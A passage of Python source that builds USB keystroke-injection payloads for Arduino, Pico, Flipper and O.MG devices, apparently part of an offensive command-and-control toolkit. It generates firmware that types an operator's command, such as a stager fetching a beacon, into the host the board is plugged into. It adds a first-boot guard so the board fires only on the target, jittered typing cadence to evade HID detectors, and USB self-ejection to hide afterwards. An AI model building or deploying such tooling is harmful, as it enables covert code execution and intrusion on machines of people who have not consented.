                                  rescue_serial=rescue_serial)
    if shots > 0:
        # BEFORE the first keystroke, not after the last: a command that fails
        # halfway has still fired at a host, and the board must not repeat it on
        # the next power-up because the run looked incomplete from here.
        body.append("  markTyped();  // one shot spent, re-flash for more")
    body += _arduino_opener(opener, delay_ms)
    body += _arduino_typing(command, layout, char_delay_ms)
    if press_enter:
        body += [
            "  delay(200);",
            "  Keyboard.press(KEY_RETURN);",
            "  delay(60);  // hold the key across a USB frame",
            "  Keyboard.releaseAll();",
        ]
    if eject:
        # Last thing setup() does: the board stops being a keyboard. Left
        # plugged into the target it would otherwise stay an armed injector
        # for as long as nobody pulls it out.
        #
        # The delay is not decoration: DETACH clears the D+ pull-up in the same
        # millisecond the last report is queued, and a detach that beats the
        # host's poll swallows the Enter the operator watched being typed. That
        # is a board that looks like it sent the command and did not.
        body += [
            "  delay(400);  // let the host poll the last report first",
            "  usbEject();  // done: off the host until a power cycle",
        ]
    body += [
        "}",
        "",
        "void loop() {}",
        "",
    ]
    return "\n".join(body)


def _pico_opener(opener: Sequence[tuple], delay_ms: int) -> list:
    body = []
    gap = min(0.5, max(0.1, delay_ms / 3000.0))
    for step in opener:
        kind = step[0]
        if kind == "keys":
            names = ", ".join(_PICO_KEY[n] for n in step[1])
            body.append("# open: " + " + ".join(step[1]))
            body.append(f"kbd.press({names})")
            body.append("kbd.release_all()")
            body.append(f"time.sleep({gap:.2f})")
        elif kind == "tap":
            body.append(f"kbd.press({_PICO_KEY[step[1]]})")
            body.append("kbd.release_all()")
            body.append(f"time.sleep({gap:.2f})")
        elif kind == "text":
            body.append(f"layout.write({step[1]!r})")
            body.append(f"time.sleep({gap:.2f})")
    return body


def _pico_typing(command: str, layout: str,
                 char_delay_ms: int = DEFAULT_CHAR_DELAY_MS) -> list:
    body = []
    if len(_cadence_pieces(command, char_delay_ms)) > 1:
        body.append("# typed below in bursts, at a human cadence. Full text:")
        body.append("#   " + command.replace("\r", " ").replace("\n", " "))
    if layout == "us":
        body.append("# the command, typed verbatim")
        body += _pico_print(command, char_delay_ms)
        return body
    for segment in segments(command, layout):
        if segment.kind == "print":
            body += _pico_print(segment.text, char_delay_ms)
            continue
        args = []
        if segment.altgr:
            args.append("Keycode.RIGHT_ALT")
        if segment.shift:
            args.append("Keycode.LEFT_SHIFT")
        args.append(f"0x{segment.usage:02X}")
        why = "AltGr" if segment.altgr else "non-US"
        body.append(f"# {why} key, HID usage 0x{segment.usage:02X}")
        body.append("kbd.press(" + ", ".join(args) + ")")
        body.append("kbd.release_all()")
    return body


def _pico_first_boot_guard(tag: int, eject: bool = False) -> list:
    """The CircuitPython half of the first-boot guard, via ``nvm``.

    ``microcontroller.nvm`` survives a reset and is NOT rewritten by copying
    ``main.py``, so the same trick works: a tag that does not match means this
    file has never run. It must not EXIT — ending ``main.py`` makes CircuitPython
    reload it, and the reload would type into the very machine we are avoiding —
    so the silent branch parks forever instead.

    With ``eject`` that branch also hides the keyboard from the machine that
    just wrote the file, so it is not left holding an idle one either.
    """
    raw = ", ".join(str((tag >> (8 * (3 - i))) & 0xFF) for i in range(4))
    body = [
        "# FIRST BOOT AFTER WRITING main.py IS SILENT.",
        "# nvm survives a reset but not a full chip erase, so a tag that does",
        "# not match means this file has never run — i.e. the machine that just",
        "# wrote it. It fires on the NEXT power-up, i.e. the target.",
        "try:",
        "    import microcontroller",
        "    _nvm = microcontroller.nvm",
        "except Exception:",
        "    _nvm = None",
        f"_BUILD_TAG = bytes([{raw}])",
        "",
        "def _just_written():",
        "    if _nvm is None or len(_nvm) < 4:",
        "        return False",
        "    if bytes(_nvm[0:4]) == _BUILD_TAG:",
        "        return False",
        "    _nvm[0:4] = _BUILD_TAG",
        "    return True",
        "",
        "if _just_written():",
        "    # never exits: a reload would type where we must not",
    ]
    if eject:
        body.append("    _usb_eject()  # and leave the machine that wrote this")
    body += [
        "    while True:",
        "        time.sleep(60)",
        "",
    ]
    return body


def _pico_usb_eject() -> list:
    """The CircuitPython half of "do not leave a live keyboard behind".

    CircuitPython has no ``setup()`` and no way to detach the USB device
    itself, so this hides the HID interface instead: the host drops the
    keyboard, which is the part that matters. The cost is real and is written
    into the artefact — only a power cycle brings the interface back, and the
    CIRCUITPY drive may stay present meanwhile.
    """
    return [
        "# EJECT: drop the HID interface so the host stops seeing a keyboard.",
        "# CircuitPython cannot detach the USB device itself, so this hides the",
        "# keyboard; only a power cycle brings it back (and the CIRCUITPY drive",
        "# may stay visible meanwhile).",
        "def _usb_eject():",
        "    try:",
        "        usb_hid.disable()",
        "    except Exception:",
        "        pass",
        "",
    ]


def _pico_countdown(seconds: int) -> list:
    """The same visible countdown: blink the board LED, else just wait."""
    seconds = max(0, int(seconds))
    return [
        "# countdown: the window to unplug this board from the machine that",
        "# just wrote it, and carry it to the target",
        "try:",
        "    import board, digitalio",
        "    _led = digitalio.DigitalInOut(board.LED)",
        "    _led.direction = digitalio.Direction.OUTPUT",
        f"    for _ in range({seconds}):",
        "        _led.value = True",
        "        time.sleep(0.12)",
        "        _led.value = False",
        "        time.sleep(0.88)",
        "except Exception:",
        f"    time.sleep({seconds})",
        "",
    ]


def _circuitpython(command: str, *, delay_ms: int, press_enter: bool,
                   opener: Sequence[tuple], layout: str,
                   char_delay_ms: int = DEFAULT_CHAR_DELAY_MS,
                   countdown_s: int = DEFAULT_COUNTDOWN_S,
                   first_boot_safe: bool = True,
                   build_tag: Optional[int] = None,
                   eject: bool = False) -> str:
    body = [
        "# PHANTOM HID payload — RP2040 / Pico, CircuitPython.",
        "# Copy this file to the board as main.py (with the adafruit_hid",
        "# library in lib/). The board presents itself as a keyboard and",
        "# types ONE command, then presses Enter.",
        "import time",
        "import usb_hid",
        "from adafruit_hid.keyboard import Keyboard",
        "from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS",
        "from adafruit_hid.keycode import Keycode",
        "",
        "kbd = Keyboard(usb_hid.devices)",
        "layout = KeyboardLayoutUS(kbd)",
        "",
        f"time.sleep({max(0.1, delay_ms / 1000.0):.2f})  # host enumerates the HID device",
        "",
    ]
    if layout != "us":
        body.append(f"# target keyboard layout: {layout} (US codes "
                    f"pre-translated)")
        body.append("")
    body.append("")
    if eject:
        body += _pico_usb_eject()
    if first_boot_safe:
        body += _pico_first_boot_guard(
            int(build_tag if build_tag is not None
                else _build_tag(command, "pico", layout)), eject=eject)
    if int(countdown_s) > 0:
        body += _pico_countdown(countdown_s)
    body += _pico_opener(opener, delay_ms)
    if opener:
        body.append("")
    body += _pico_typing(command, layout, char_delay_ms)
    if press_enter:
        body += [
            "",
            "time.sleep(0.2)",
            "kbd.press(Keycode.ENTER)",
            "kbd.release_all()",
            "",
        ]
    if eject:
        # Last statement in the file: the host stops seeing a keyboard. There is
        # no setup() here, so "after typing" is simply the next line.
        body += ["_usb_eject()", ""]
    return "\n".join(body)


def build_hid_payload(board: str, command: str, *,
                      target: str = "",
                      layout: str = "us",
                      delay_ms: int = DEFAULT_DELAY_MS,
                      press_enter: bool = True,
                      open_run: bool = False,
                      arm: bool = False,
                      arm_pin: int = 7,
                      char_delay_ms: int = DEFAULT_CHAR_DELAY_MS,
                      countdown_s: int = DEFAULT_COUNTDOWN_S,
                      first_boot_safe: bool = True,
                      eject: bool = False,
                      shots: int = DEFAULT_SHOTS,
                      rescue_serial: bool = True,
                      build_nonce: str = "") -> HidPayload:
    """Build the artefact for one board, or say why it cannot be built.

    ``layout`` is the layout the TARGET has active (``us``/``it``): the typed
    command is pre-translated so the US scan codes these boards send come out
    as the intended characters.

    ``shots`` (Arduino/AVR, needs an EEPROM for the counter) is how many
    DELIVERIES one flash is worth: each power-up that types spends one, and
    when the last is spent every later power-up is silent until re-flashed.
    That is what stops the board from re-injecting on the machine that flashed
    it when the operator carries it back, without making it useless after the
    first shell. ``0`` = unlimited.

    Raises ``ValueError`` on an unknown board, an unknown layout, an empty
    command, or a character the chosen layout has no verified key for: a blank
    HID payload is a bad flash, and a guessed key is a wrong character in a
    command the operator will run as root.
    """
    board = canonical_board(board)
    if board not in BOARDS:
        raise ValueError(f"unknown HID board {board!r}: choose from "
                         f"{', '.join(ALL_BOARD_NAMES)}")
    layout = normalize_layout(layout)
    command = (command or "").strip()
    # the operator quotes the command on the command line; a keystroke
    # injector would type those grouping quotes as part of the instruction
    if len(command) >= 2 and command[0] == command[-1] \
            and command[0] in "\"'":
        command = command[1:-1].strip()
    if not command:
        raise ValueError("no command to type: a HID payload cannot be empty")
    target = (target or "").strip().lower()

    notes = []
    opener: Tuple[tuple, ...] = ()
    if open_run:
        if target in _OPENERS:
            opener = _OPENERS[target]
            notes.append(f"target {target}: opens the "
                         f"{_OPENER_LABELS[target]} before typing")
        elif target:
            notes.append(
                f"target {target}: no opener is known for it — open a shell "
                f"on the target yourself, the board cannot guess the keystroke")
        else:
            # no target: fall back to the one opener that is on every Windows
            # box, and SAY that is the assumption
            opener = _OPENERS["windows"]
            notes.append("no target given: assuming a Windows run dialog "
                         "(Win+R); pass --target for the right opener")
    notes.extend(mismatch_hints(command, target))
    if target == "macos" and layout != "us":
        # Porting the IT/DE tables to macOS is not a guess: the AltGr
        # combinations live on the SAME physical keys, and right-alt IS the
        # Option modifier on macOS, so the same key events reach the same
        # characters. What is NOT measured is a macOS-only divergence in a
        # non-US layout, and saying so is cheaper than a wrong flash.
        notes.append(
            "macOS: AltGr is OPTION there, and right-alt is Option — the "
            "combos in this artefact are the same physical keys. A "
            "macOS-only divergence in a non-US layout has NOT been measured: "
            "check the typed line on the target before trusting it")
    if target == "android":
        notes.append(
            "android: there is no keyboard shortcut that opens a terminal — "
            "the board types into whatever has FOCUS, so a terminal app "
            "(Termux) must be open, focused and in the foreground before the "
            "board is plugged in")
    if target == "android":
        notes.append(
            "android: the typed fetcher assumes sh + curl, as Termux ships "
            "them; a device with neither runs the command and produces "
            "nothing (the beacon route is /api/v1/payload_android)")
    if not target:
        notes.append("the typed command must match the TARGET os: nothing "
                     "here detects it (the board types into whatever it is "
                     "plugged into)")

    if layout != "us":
        missing = unsupported_chars(command, layout)
        if missing:
            if is_strict(layout):
                notes.append(
                    f"layout {layout}: no verified key produces "
                    f"{''.join(missing)!r} — the build is REFUSED rather "
                    f"than typing an approximation; reword the command or "
                    f"pick another layout")
            else:
                notes.append(
                    f"layout {layout}: no key produces "
                    f"{''.join(missing)!r} — the board will type something "
                    f"else there; reword the command")
        needs_keys = special_key_chars(command, layout)
        if needs_keys and board in DUCKYSCRIPT_BOARDS:
            if is_strict(layout):
                # A strict layout has no fallback: STRING would send the US
                # character, which on this layout is a DIFFERENT character.
                # Refusing is the only honest outcome.
                raise ValueError(
                    f"layout {layout!r}: DuckyScript STRING cannot press "
                    f"{''.join(needs_keys)!r} (they need AltGr or a non-US "
                    f"key), and typing the US character instead would put "
                    f"the wrong one in the command — use an "
                    f"Arduino/CircuitPython board or reword it")
            notes.append(
                f"layout {layout}: DuckyScript STRING cannot type "
                f"{''.join(needs_keys)!r} (they need AltGr or a non-US key) — "
                f"shorten or reword the command")
        elif needs_keys:
            notes.append(
                f"layout {layout}: {''.join(needs_keys)!r} are typed as "
                f"explicit AltGr / non-US key combinations")

    char_delay_ms = max(0, int(char_delay_ms))
    countdown_s = max(0, int(countdown_s))
    shots = max(0, int(shots))
    tag = _build_tag(command, board, layout, build_nonce)
    if countdown_s > 0 and board in DUCKYSCRIPT_BOARDS:
        notes.append(
            f"countdown of {countdown_s}s written as a DELAY: the device types "
            f"as soon as it is plugged in, so unplug it and carry it inside "
            f"that window")
    elif countdown_s > 0:
        notes.append(
            f"{countdown_s}s countdown on a blinking LED before the first "
            f"keystroke: that is the window to unplug it from the machine you "
            f"just wrote it with (--countdown 0 to skip it)")
    if first_boot_safe and board in DUCKYSCRIPT_BOARDS:
        notes.append(
            "first-boot guard NOT available here: a DuckyScript device has no "
            "storage of its own, so it will type on the machine that writes it "
            "too — use an Arduino or Pico artefact if that matters")
    elif first_boot_safe:
        notes.append(
            "the first boot after a flash is SILENT (a per-build tag in "
            "EEPROM/nvm): it stays quiet on the machine that just wrote it and "
            "fires on the next power-up — i.e. where you carried it")
    if rescue_serial and board in ARDUINO_BOARDS:
        notes.append(
            "SERIAL RESCUE on: the sketch opens a CDC port, so a reflash is a "
            "plain `arduino-cli upload` (it opens the port at 1200 baud, which "
            "is the bootloader's signal) and never needs a wire on the reset "
            "pin. Cost: the board enumerates as HID + CDC, and after it has "
            "delivered it stays attached but silent so it can be reflashed "
            "(--no-serial-rescue for a HID-only profile)")
    elif board in ARDUINO_BOARDS:
        notes.append(
            "SERIAL RESCUE OFF: this board exposes no CDC port and ejects on "
            "the silent boots, so reflashing it again needs the bootloader to "
            "be opened by hand (double reset) — HID-only in exchange")
    if shots > 0 and board in ARDUINO_BOARDS and first_boot_safe:
        notes.append(
            f"{shots} DELIVERIES per flash: the counter in EEPROM is "
            f"decremented before each delivery, so the board fires {shots} "
            f"time(s) and is then silent on every later power-up — carrying it "
            f"home does not re-inject. Re-flashing resets the counter "
            f"(--repeat = unlimited)")
    elif shots > 0 and board in DUCKYSCRIPT_BOARDS:
        notes.append(
            "the delivery counter NOT available on a DuckyScript device: it "
            "has no storage of its own, so it re-types the script on every "
            "plug-in")
    if eject and board in DUCKYSCRIPT_BOARDS:
        notes.append(
            "eject NOT available on a DuckyScript device: the script cannot "
            "control its own USB interface, so this board keeps typing on the "
            "machine that writes it and stays a live keyboard until it is "
            "unplugged")
    elif eject:
        notes.append(
            "the board EJECTS itself when it is done — and instead of typing "
            "on the first boot after a flash: the host sees an unplug while "
            "the board keeps running, so no live keyboard is left behind and "
            "nothing re-injects until the next power-up")
    if eject and board == "pico":
        notes.append(
            "on a Pico the ejection hides the keyboard but only a power cycle "
            "brings it back (CircuitPython cannot detach the USB device "
            "itself), and the CIRCUITPY drive may stay present")
    if len(command) > LONG_COMMAND_CHARS:
        notes.append(
            f"very long command ({len(command)} chars): a keystroke injector "
            f"types it on screen IN FULL and it takes seconds — keep the "
            f"target focused and the board plugged in until typing finishes")
    if char_delay_ms > 0 and board in DUCKYSCRIPT_BOARDS:
        notes.append(
            "cadence NOT applied here: DuckyScript's STRING types at the "
            "device's own fixed rate (an O.MG cable can add its own delay "
            "line, a Flipper cannot) — this board types the command in well "
            "under a second, which is the loudest thing about it")
    elif char_delay_ms > 0 and len(command) >= CADENCE_MIN_CHARS:
        notes.append(
            f"typed in bursts at ~{1000 // char_delay_ms} chars/s with a "
            f"jittered pause between them: a board at full speed is the "
            f"second thing a HID detector sees after the device itself. That "
            f"costs ~{len(command) * char_delay_ms // 1000}s of on-screen "
            f"typing; --cadence 0 types it in one burst")

    if board in DUCKYSCRIPT_BOARDS:
        content = _duckyscript(command, delay_ms=delay_ms,
                               press_enter=press_enter, opener=opener,
                               layout=layout, countdown_s=countdown_s)
        filename = "phantom_hid.txt"
    elif board in ARDUINO_BOARDS:
        content = _arduino_sketch(command, delay_ms=delay_ms,
                                  press_enter=press_enter, opener=opener,
                                  layout=layout, arm=arm, arm_pin=arm_pin,
                                  char_delay_ms=char_delay_ms,
                                  countdown_s=countdown_s,
                                  first_boot_safe=first_boot_safe,
                                  build_tag=tag, eject=eject,
                                  shots=shots,
                                  rescue_serial=rescue_serial,
                                  build_nonce=build_nonce)
        filename = "phantom_hid.ino"
    else:
        content = _circuitpython(command, delay_ms=delay_ms,
                                 press_enter=press_enter, opener=opener,
                                 layout=layout, char_delay_ms=char_delay_ms,
                                 countdown_s=countdown_s,
                                 first_boot_safe=first_boot_safe,
                                 build_tag=tag, eject=eject)
        filename = "main.py"
    return HidPayload(board=board, filename=filename, content=content,
                      target=target, layout=layout, notes=tuple(notes))


def board_notes(board: str) -> Tuple[str, ...]:
    """How each board is flashed — the part that is not in the artefact."""
    board = canonical_board(board)
    if board == "pico":
        return ("copy board firmware + lib/adafruit_hid, then write main.py "
                "to the CIRCUITPY volume",
                "a Pico is the only board here that can be rebuilt from a "
                "plain USB cable (RP2040 BOOTSEL)",)
    if board == "flipper":
        return ("copy the .txt to /ext/badusb/ on the SD card, then "
                "BadUSB -> the script (the Flipper acts as the keyboard)",)
    if board == "omg":
        return ("paste the DuckyScript into the O.MG cable web UI and store "
                "it on the device (the cable is the keyboard)",)
    if board in ARDUINO_BOARDS:
        return ("open the .ino in the Arduino IDE and upload it: the board "
                "is the keyboard",
                "the Arduino IDE refuses a sketch whose folder is not named "
                "after the .ino file: keep them together, e.g. "
                "arduino_phantom_hid/arduino_phantom_hid.ino (the default "
                "output path already does this)",
                "the payload is the TYPED COMMAND, not a file on the board — "
                "a 42 KB flash board carries the stager fine because the "
                "beacon is downloaded, never stored",
                "F() keeps the string in flash: an ATmega-class board with "
                "~2.5 KB of RAM still types a multi-kilobyte command",
                "the board types as soon as it is POWERED, so flash it with "
                "the countdown ON (default 3 s, LED blinking) and carry it "
                "inside that window",
                "a first boot after a flash is SILENT: the per-build tag in "
                "EEPROM does not match yet, so the sketch that just ran on "
                "your machine types nothing and fires on the next power-up",
                "--arm is still the stronger gate when you reflash in place: "
                "two presses on a button on --arm-pin to GND")
    return ()
